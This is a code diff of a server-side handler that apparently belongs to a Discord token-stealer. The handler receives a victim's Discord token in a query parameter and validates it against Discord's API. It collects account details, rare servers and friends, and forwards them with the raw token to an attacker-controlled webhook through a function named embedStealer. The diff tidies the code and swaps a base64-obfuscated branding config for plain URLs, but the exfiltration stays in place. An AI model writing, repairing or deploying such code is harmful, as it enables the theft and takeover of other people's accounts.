@@ -1,6 +1,8 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
 import DiscordToken from 'discord.js-token';
-import k4itrunConfig from '../../../../k4itrun.config'
+import fetch from 'node-fetch'; // Añade este import para manejar la función fetch correctamente
+
+import k4itrunConfig from '../../../../k4itrun.config';
 
 const webhook = new WebhookClient({
   url: k4itrunConfig.webhook,
@@ -15,21 +17,23 @@ export default async function handler(req, res) {
   try {
     const { query } = req;
     if (!query.data) {
-      res.status(400).send('Bad Request: Missing "data" query parameter');
+      res.status(400).send('Bad Request: Missing "data" query parameter.');
       return;
     }
 
     const { data } = query;
-    const embed = await getEmbed();
+
     const resp = await fetch('https://discord.com/api/v9/users/@me', { headers: { authorization: data } });
-    const json = await resp.json()
+   
+    const json = await resp.json();
 
     console.log(json);
 
-    const infos = DiscordToken(data).all, 
-      guilds = DiscordToken(data).guilds.rares,
-      friends = DiscordToken(data).friends.rares;
-    const embedBuilder = json.id ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
+    const infos = DiscordToken(data).all; 
+    const guilds = DiscordToken(data).guilds.rares; 
+    const friends = DiscordToken(data).friends.rares;
+    const embed = await getEmbed();
+    const embedBuilder = infos.ID ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
 
     await webhook.send({
       embeds: [embedBuilder],
@@ -89,10 +93,19 @@ function embedStealer(infos, guilds, friends, token, embed) {
 }
 
 async function getEmbed() {
-  const embed = JSON.parse(Buffer.from('eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=','base64').toString('utf-8'));
-  return {
-    avatar: embed.avatar_url ? embed.avatar_url : "",
-    url: embed.discord ? embed.discord : "",
-    footericon: embed.footer_url ? embed.footer_url : "",
-  };
+  try {
+    const embed = {
+      avatar_url: "https://i.imgur.com/WkKXZSl.gif",
+      discord: "https://discord.gg/aurathemes",
+      footer_url: "https://discord.gg/aurathemes",
+    };
+    return {
+      avatar: embed.avatar_url ,
+      url: embed.discord,
+      footericon: embed.footer_url,
+    };
+  } catch (error) {
+    console.error('Error parsing embed JSON:', error);
+    return {}; 
+  }
 }
